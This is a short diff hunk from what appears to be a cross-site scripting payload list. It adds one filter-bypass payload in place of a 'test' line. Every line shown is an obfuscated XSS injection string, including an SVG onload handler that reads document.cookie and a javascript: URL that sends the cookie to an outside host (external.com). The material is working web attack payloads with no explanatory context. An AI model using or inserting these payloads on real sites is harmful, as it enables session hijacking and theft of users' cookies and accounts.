@@ -194,4 +194,4 @@ a=eval,c=["a"],x=["lert"],t=\${c}${x}(origin)`,http://a.call`1${t}``
 <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
 javascript%3Alocation%2f**%2f=%27https://external.com/?%27%2bdocument.cookie
 '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
-test
+--'<00 foo="<a%20href="javascript:prompt(404)">XSS-Click</00>--%20//
